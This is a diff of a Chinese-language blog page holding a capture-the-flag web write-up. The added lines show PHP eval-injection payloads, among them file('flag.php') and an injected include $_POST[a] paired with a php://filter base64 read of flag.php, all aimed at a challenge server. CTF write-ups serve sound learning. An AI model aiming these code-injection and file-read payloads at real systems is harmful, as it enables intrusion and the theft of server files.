@@ -105,9 +105,11 @@
 <meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/webvim3.PNG">
 <meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/webvim4.PNG">
 <meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/webvim5.PNG">
+<meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/baohanqiguai1.PNG">
+<meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/baohanqiguai2.PNG">
 <meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/cookiesburp.PNG">
 <meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/cookiesburp2.PNG">
-<meta property="og:updated_time" content="2017-10-03T09:23:25.418Z">
+<meta property="og:updated_time" content="2017-10-06T05:26:06.210Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="找源码的web题目">
 <meta name="twitter:description" content="vim不正常退出">
@@ -410,7 +412,13 @@
 <p>当然 可改进为 ?hello=);show_source(‘flag.php’);//</p>
 <p>即 eval(“var_dump();show_source(‘flag.php’);//);”);</p>
 <p><em>eval函数中，”” 内部为代码，//只在代码中起作用，相当于只注释了）；</em></p>
-<p>最后贴一篇文件包含的文章<br><a href="http://www.2cto.com/article/201304/204158.html" target="_blank" rel="external">http://www.2cto.com/article/201304/204158.html</a> `</p>
+<p>最后贴一篇文件包含的文章<br><a href="http://www.2cto.com/article/201304/204158.html" target="_blank" rel="external">http://www.2cto.com/article/201304/204158.html</a> </p>
+<p>最后的最后 又看到了两种方法 </p>
+<p>?hello=file(“flag.php”)  (好吧这种方法感觉比较奇葩)</p>
+<p><img src="http://otvzfr1o1.bkt.clouddn.com/baohanqiguai1.PNG" alt=""></p>
+<p>还有一种 构造出文件包含</p>
+<p><a href="http://120.24.86.145:8003/?hello=);include" target="_blank" rel="external">http://120.24.86.145:8003/?hello=);include</a> $_POST[a];//<br>a=php://filter/read=convert.base64-encode/resource=flag.php</p>
+<p><img src="http://otvzfr1o1.bkt.clouddn.com/baohanqiguai2.PNG" alt=""></p>
 <h3 id="读文件-cookie欺骗"><a href="#读文件-cookie欺骗" class="headerlink" title="读文件 cookie欺骗"></a>读文件 cookie欺骗</h3><p>感觉挺好的一道题 学到了不少</p>
 <p>题目 url <a href="http://120.24.86.145:8002/web11/index.php?line=&amp;filename=a2V5cy50eHQ=" target="_blank" rel="external">http://120.24.86.145:8002/web11/index.php?line=&amp;filename=a2V5cy50eHQ=</a></p>
 <p>至于题目页面显示的是一串很长的字符 后来发现没什么用</p>
